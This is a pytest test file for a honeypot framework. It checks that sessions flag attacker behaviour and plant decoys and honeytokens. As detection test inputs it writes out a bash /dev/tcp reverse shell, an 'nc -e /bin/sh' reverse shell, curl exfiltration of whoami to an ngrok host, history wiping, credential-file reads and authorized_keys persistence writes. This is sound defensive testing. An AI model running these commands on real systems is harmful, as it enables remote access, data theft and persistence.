"""Unit tests for Persona and Session lifecycle."""
import pytest

from plenith.session import Session

class TestPersonaLoading:
    def test_three_personas_load(self, personas):
        names = {p.username for p in personas}
        assert names == {"jdoe", "agarcia", "mwilson"}

    def test_jdoe_has_no_custom_history_pool(self, persona_jdoe):
        assert persona_jdoe.bash_history_pool is None

    def test_agarcia_has_custom_history_pool(self, persona_agarcia):
        assert persona_agarcia.bash_history_pool is not None
        assert any("kubectl" in c for c in persona_agarcia.bash_history_pool)

    def test_mwilson_has_ir_history_pool(self, persona_mwilson):
        assert persona_mwilson.bash_history_pool is not None
        pool = " ".join(persona_mwilson.bash_history_pool)
        assert "osquery" in pool or "sigma" in pool.lower()

class TestSessionInit:
    def test_fresh_session_starts_in_home(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        assert s.cwd == "/home/jdoe"
        assert s.connection_count == 1
        assert s._restored_from_state is False
        assert s.commands == []
        assert s.actions_taken == []

    def test_fresh_session_has_unique_engagement_id(self, persona_jdoe):
        s1 = Session("jdoe", "127.0.0.1", persona_jdoe)
        s2 = Session("jdoe", "127.0.0.1", persona_jdoe)
        assert s1.engagement_id != s2.engagement_id

    def test_fresh_observations_have_no_alerts(self, persona_jdoe):
        s = Session("jdoe", "127.0.0.1", persona_jdoe)
        for k, v in s.observed.items():
            if k.startswith("alerted_"):
                assert v is False, f"{k} should start False"

    def test_honeytokens_deterministic_per_engagement_id(self, persona_jdoe):
        s1 = Session("jdoe", "127.0.0.1", persona_jdoe)
        s1.engagement_id = "fixed-id"
        # Re-init internals to apply the new id
        from plenith.synthetic import Honeytokens
        import random as _r
        s1.honeytokens = Honeytokens.generate_for(persona_jdoe, _r.Random("fixed-id"))
        s2_ht = Honeytokens.generate_for(persona_jdoe, _r.Random("fixed-id"))
        assert s1.honeytokens.aws_credentials == s2_ht.aws_credentials

class TestSessionObservations:
    def test_string_observations(self, session):
        session.update_observations("sudo -l")
        assert session.observed["ran_sudo"] is True

        session.update_observations("mysql -u root -p")
        assert "mysql" in session.observed["services_probed"]

        session.update_observations("ssh db-prod-01")
        assert session.observed["attempted_lateral"] is True

    def test_reverse_shell_pattern(self, session):
        session.update_observations("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
        assert session.observed["reverse_shell_attempted"] is True

    def test_nc_e_reverse_shell(self, session):
        session.update_observations("nc -e /bin/sh 10.0.0.1 4444")
        assert session.observed["reverse_shell_attempted"] is True

    def test_dns_exfil_pattern(self, session):
        session.update_observations("curl https://x.ngrok.io/$(whoami)")
        assert session.observed["dns_exfil_attempted"] is True

    def test_lateral_to_decoy_pattern(self, session):
        session.update_observations("ssh db-prod-01")
        assert session.observed["lateral_to_decoy"] is True
        assert "db-prod-01" in session.observed["decoy_targets"]

    def test_log_tampering_pattern(self, session):
        session.update_observations("history -c")
        assert session.observed["log_tampering"] is True

    def test_sudo_elevation_pattern(self, session):
        session.update_observations("sudo -i")
        assert session.observed["attempted_sudo_elevation"] is True

    def test_ssh_to_random_host_does_not_fire_decoy(self, session):
        session.update_observations("ssh github.com")
        assert session.observed["lateral_to_decoy"] is False

    def test_curl_benign_does_not_fire_exfil(self, session):
        session.update_observations("curl https://api.acme.corp/health")
        assert session.observed["dns_exfil_attempted"] is False

class TestVFSEventObservations:
    def test_credential_read_tracked(self, session):
        session.observe_vfs_event("read", "/home/jdoe/.aws/credentials")
        assert "/home/jdoe/.aws/credentials" in session.observed["credential_files_read"]

    def test_ssh_persistence_write_tracked(self, session):
        session.observe_vfs_event("write", "/home/jdoe/.ssh/authorized_keys")
        assert session.observed["ssh_persistence_attempt"] is True

    def test_payload_drop_tracked(self, session):
        session.observe_vfs_event("touch", "/tmp/payload.sh")
        assert "/tmp/payload.sh" in session.observed["payload_drops"]

    def test_honeytoken_modification(self, session):
        # Pretend a known honeytoken path is being overwritten
        path = list(session.honeytokens.files.keys())[0]
        session.observe_vfs_event("write", path)
        assert path in session.observed["honeytoken_modifications"]

class TestPlantDecoy:
    def test_plants_file_in_vfs(self, session):
        session.plant_decoy("/tmp/lure.txt", "bait-content\n")
        body = session.vfs.read("/tmp/lure.txt", cwd=None, home=None)
        assert body == "bait-content\n"

    def test_records_in_decoys_planted(self, session):
        session.plant_decoy("/tmp/lure.txt", "x")
        assert "/tmp/lure.txt" in session.observed["decoys_planted"]

    def test_credential_decoy_registers_as_honeytoken(self, session):
        session.plant_decoy("/home/jdoe/.aws/dev_credentials", "akia...", is_credential=True)
        assert "/home/jdoe/.aws/dev_credentials" in session.honeytokens.files

class TestSerializeObserved:
    def test_sets_become_lists(self, session):
        session.observed["payload_drops"].add("/tmp/x")
        out = session._serialize_observed()
        assert isinstance(out["payload_drops"], list)
        assert "/tmp/x" in out["payload_drops"]

    def test_roundtrip(self, session):
        session.observed["payload_drops"].add("/tmp/x")
        session.observed["ran_sudo"] = True
        ser = session._serialize_observed()
        back = Session._deserialize_observed(ser)
        assert back["ran_sudo"] is True
        assert "/tmp/x" in back["payload_drops"]
        assert isinstance(back["payload_drops"], set)
